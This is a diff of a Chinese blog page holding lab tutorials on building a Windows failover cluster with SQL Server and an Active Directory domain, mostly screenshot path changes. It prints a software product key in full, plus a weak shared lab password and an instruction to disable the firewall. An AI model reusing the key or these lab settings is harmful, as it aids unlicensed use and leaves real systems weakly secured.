+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127114425542.png" class="" title="image-20241127114425542">
+<p>产品密钥<code>HMWJ3-KY3J2-NMVD7-KG4JR-X2G8G</code></p>
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127113009454.png" class="" title="image-20241127113009454">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127202716946.png" class="" title="image-20241127202716946">
+<p>勾选自己所需要的功能(没必要全部勾选) 这里我就勾选了必备功能(后期还可以在自行添加)</p>
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127202829193.png" class="" title="image-20241127202829193">
+<p>点击【下一步】</p>
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127204455309.png" class="" title="image-20241127204455309">
+<p>添加进虚拟机的cd驱动器里</p>
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127210851715.png" class="" title="image-20241127210851715">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127210949542.png" class="" title="image-20241127210949542">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128060901585.png" class="" title="image-20241128060901585">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127211608435.png" class="" title="image-20241127211608435">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127214801612.png" class="" title="image-20241127214801612">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128055636520.png" class="" title="image-20241128055636520">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128060204872.png" class="" title="image-20241128060204872">
+<p>这里的ip地址同样需要填写一个未被分配的ip地址，<code>192.168.80.35</code>，需要输入之前加入域的账号和密码</p>
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128061043800.png" class="" title="image-20241128061043800">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128001803466.png" class="" title="image-20241128001803466">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128001911401.png" class="" title="image-20241128001911401">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128001941449.png" class="" title="image-20241128001941449">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128003915049.png" class="" title="image-20241128003915049">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128004103519.png" class="" title="image-20241128004103519">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128004946141.png" class="" title="image-20241128004946141">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128011921550.png" class="" title="image-20241128011921550">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241129034004415.png" class="" title="image-20241129034004415">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241129034113133.png" class="" title="image-20241129034113133">
+<h3 id="（七）测试故障转移"><a href="#（七）测试故障转移" class="headerlink" title="（七）测试故障转移"></a>（七）测试故障转移</h3><ol>
+<li><strong>测试场景</strong>：<ul>
+<li>关闭 NodeA 或断开网络，观察服务是否自动切换到 NodeB。</li>
+<li>停止 SQL Server 服务，观察是否影响故障转移。</li>
+</ul>
+</li>
+<li><strong>预期结果</strong>：<ul>
+<li>服务能够在节点间正常切换。</li>
+<li>SQL Server 故障不会影响整体群集运行。</li>
+</ul>
+</li>
+</ol>
+<h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><ol>
+<li>实验通过搭建故障转移群集，验证了其高可用性和容错性。</li>
+<li>通过配置 ISCSI 存储服务器和共享磁盘，深入理解了存储资源在群集中的作用。</li>
+<li>通过实验进一步掌握了 SQL Server 故障转移群集的安装与配置技巧。</li>
+<li>实验中需重点关注：<ul>
+<li>网络连接和服务器配置的准确性。</li>
+<li>依赖服务和权限的正确性。</li>
+</ul>
+</li>
+<li>故障转移群集的搭建对提高系统稳定性和可靠性具有重要意义。</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -205,9 +944,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2024-11-21 14:33:20 / 修改时间：14:35:19" itemprop="dateCreated datePublished" datetime="2024-11-21T14:33:20+08:00">2024-11-21</time>
+      <time title="创建时间：2024-11-21 14:33:20" itemprop="dateCreated datePublished" datetime="2024-11-21T14:33:20+08:00">2024-11-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-12-03 08:43:04" itemprop="dateModified" datetime="2024-12-03T08:43:04+08:00">2024-12-03</time>
     </span>
 
   
@@ -311,47 +1056,47 @@
 </li>
 </ol>
 </blockquote>
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119101901179.png" class="" title="image-20241119101901179">
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119135115969.png" class="" title="image-20241119135115969">
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119135130989.png" class="" title="image-20241119135130989">
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119141652609.png" class="" title="image-20241119141652609">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119101901179-1733186553290-1.png" class="" title="image-20241119101901179">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119135115969-1733186553292-4.png" class="" title="image-20241119135115969">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119135130989-1733186553291-2.png" class="" title="image-20241119135130989">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119141652609-1733186553292-3.png" class="" title="image-20241119141652609">
 <h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a><strong>实验步骤</strong></h2><h3 id="1-创建域服务器"><a href="#1-创建域服务器" class="headerlink" title="1. 创建域服务器"></a>1. <strong>创建域服务器</strong></h3><ol>
 <li><p><strong>配置 Master 节点</strong>：</p>
 <ul>
 <li>将 Master 节点设置为域控制器，关闭防火墙，配置 IP 地址和子网掩码。 </li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119090522634.png" class="" title="image-20241119090522634"></li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119144201106.png" class="" title="image-20241119144201106"></li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119090522634-1733186553292-5.png" class="" title="image-20241119090522634"></li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119144201106-1733186553292-6.png" class="" title="image-20241119144201106"></li>
 <li>测试 Master 与 Node A 的连通性，确保网络通信正常。 </li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119090656263.png" class="" title="image-20241119090656263"></li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119090656263-1733186553292-7.png" class="" title="image-20241119090656263"></li>
 </ul>
 </li>
 <li><p><strong>安装 Active Directory 域服务</strong>：</p>
 <ul>
 <li>打开“服务器管理器”，选择“添加角色和功能”。 </li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091008961.png" class="" title="image-20241119091008961"></li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091038796.png" class="" title="image-20241119091038796"></li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091231831.png" class="" title="image-20241119091231831"></li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091008961-1733186553292-8.png" class="" title="image-20241119091008961"></li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091038796-1733186553292-9.png" class="" title="image-20241119091038796"></li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091231831-1733186553292-10.png" class="" title="image-20241119091231831"></li>
 <li>在“服务器角色”中，选择“Active Directory 域服务”，并继续安装。 </li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091514916.png" class="" title="image-20241119091514916"></li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091636710.png" class="" title="image-20241119091636710"></li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091715409.png" class="" title="image-20241119091715409"></li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091514916-1733186553293-11.png" class="" title="image-20241119091514916"></li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091636710-1733186553293-12.png" class="" title="image-20241119091636710"></li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091715409-1733186553293-13.png" class="" title="image-20241119091715409"></li>
 <li>安装完成后，点击“将此服务器提升为域控制器”。 </li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119092647158.png" class="" title="image-20241119092647158"></li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119092647158-1733186553293-14.png" class="" title="image-20241119092647158"></li>
 <li>在“部署配置”中，选择“添加新林”，并设置根域名为 <code>ha.com</code>。</li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119092748526.png" class="" title="image-20241119092748526"> </li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119092748526-1733186553293-15.png" class="" title="image-20241119092748526"> </li>
 <li>在“域控制器选项”中，设置目录服务还原模式 (DSRM) 密码（如：<code>Aa123456?</code>）。 </li>
 <li>在“DNS 选项”和“其他选项”中，使用系统默认设置。 </li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119093020997.png" class="" title="image-20241119093020997"></li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119093334122.png" class="" title="image-20241119093334122"></li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119093020997-1733186553293-16.png" class="" title="image-20241119093020997"></li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119093334122-1733186553293-17.png" class="" title="image-20241119093334122"></li>
 <li>进入管理员账户（控制面板），对账户设置密码，创建Administrator账户的密码为Aa123456?</li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119093653025.png" class="" title="image-20241119093653025"></li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119093751310.png" class="" title="image-20241119093751310"></li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119093653025-1733186553293-18.png" class="" title="image-20241119093653025"></li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119093751310-1733186553293-19.png" class="" title="image-20241119093751310"></li>
 <li>在“先决条件检查”中，确保所有检查通过，然后点击“安装”。 </li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119093856742.png" class="" title="image-20241119093856742"></li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119093856742-1733186553293-20.png" class="" title="image-20241119093856742"></li>
 <li>安装完成后，服务器将自动重启，完成域控制器的配置。 </li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119095248275.png" class="" title="image-20241119095248275"></li>
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119095248275-1733186553293-21.png" class="" title="image-20241119095248275"></li>
 <li>重新配置密码Aa123456?</li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119095502452.png" class="" title="image-20241119095502452">
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119095502452-1733186553294-22.png" class="" title="image-20241119095502452">
 </li>
 </ul>
 </li>
@@ -360,33 +1105,33 @@
 <li><p><strong>配置 Node A 节点</strong>：</p>
 <ul>
 <li><p>打开“服务器管理器”，选择“添加角色和功能”，安装 DNS 服务器角色。 </p>
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119094113885.png" class="" title="image-20241119094113885">
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119094155042.png" class="" title="image-20241119094155042">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119094113885-1733186553294-23.png" class="" title="image-20241119094113885">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119094155042-1733186553294-24.png" class="" title="image-20241119094155042">
 </li>
 <li><p>安装完成后，重启服务器。 </p>
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119095749416.png" class="" title="image-20241119095749416">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119095749416-1733186553294-25.png" class="" title="image-20241119095749416">
 </li>
 <li><p>右键“此电脑”，选择“属性”，点击“更改设置”，在“计算机名”选项卡中，点击“更改”。 </p>
 </li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119100200384.png" class="" title="image-20241119100200384">
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119100200384-1733186553294-26.png" class="" title="image-20241119100200384">
 </li>
 <li><p>将计算机名称设置为 <code>Node A</code>，并选择“域”，输入 <code>ha.com</code>，点击“确定”。 </p>
 </li>
 <li><p>系统提示输入具有加入域权限的账户信息，输入域管理员账户（如：<code>Administrator</code>）和密码（如：<code>Aa123456?</code>）。 </p>
 </li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119163241979.png" class="" title="image-20241119163241979">
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119163241979-1733186553294-27.png" class="" title="image-20241119163241979">
 </li>
 <li><p>成功加入域后，系统提示重启，点击“确定”并重启服务器。 </p>
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119163322292.png" class="" title="image-20241119163322292">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119163322292-1733186553294-28.png" class="" title="image-20241119163322292">
 </li>
 </ul>
 </li>
 <li><p><strong>配置 Node B 节点</strong>：</p>
 <ul>
 <li><p>按照与 Node A 相同的步骤进行配置，确保成功加入 <code>ha.com</code> 域。 </p>
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119163825095.png" class="" title="image-20241119163825095">
